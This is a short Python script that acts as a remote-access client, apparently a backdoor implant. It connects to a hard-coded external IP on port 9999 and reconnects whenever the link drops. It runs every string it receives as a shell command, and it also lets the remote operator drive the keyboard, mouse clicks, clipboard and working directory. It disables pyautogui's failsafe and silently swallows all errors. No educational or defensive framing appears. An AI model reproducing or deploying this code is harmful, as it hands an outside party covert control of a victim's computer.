import socket
import os
import subprocess
import time
import pyautogui
import pyperclip

s = socket.socket()
host = '103.173.227.65'
port = 9999
pyautogui.FAILSAFE = False
is_connect = False


def is_socket_closed(sock: socket.socket) -> bool:
    try:
        # this will try to read bytes without blocking and also without removing them from buffer (peek only)
        sock.setblocking(0)
        data = sock.recv(16, socket.MSG_PEEK)
        if len(data) == 0:
            return True
    except BlockingIOError:
        return False  # socket is open and reading from it would block
    except ConnectionResetError:
        return True  # socket was closed for some other reason
    except Exception as e:
        return False
    return False


while True:
    try:
        if not is_connect:
            print('Trying connect')
            s.connect((host, port))
            print('Connected to server')
            is_connect = True
        else:
            if is_socket_closed(sock=s):
                print('Retry connect')
                time.sleep(5)
                is_connect = False
                s = socket.socket()
                continue
        data = s.recv(20480)

        if data[:6].decode("utf-8") == 'pr cpy':
            key = data[7:].decode()
            print(f'key : {key} copied')
            pyperclip.copy(key)

        if data[:6].decode("utf-8") == 'pr pst':
            pyautogui.hotkey('ctrl', 'v')

        if data[:2].decode("utf-8") == 'pr':
            key = data[3:].decode("utf-8")[2:-1]
            print(key)
            pyautogui.press(key)

        if data[:2].decode("utf-8") == 'cd':
            os.chdir(data[3:].decode("utf-8"))

        if data[:2].decode("utf-8") == 'cl':
            x, y = data[3:].decode("utf-8").split()
            pyautogui.click(int(x), int(y))

        if len(data) > 0:
            print(data)
            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE,
                                   stderr=subprocess.PIPE)
            # output_byte = cmd.stdout.read() + cmd.stderr.read()
            # output_str = str(output_byte, "utf-8")
            # currentWD = os.getcwd() + "> "
            # s.send(str.encode(output_str + currentWD))
            # print(output_str)
    except:
        pass
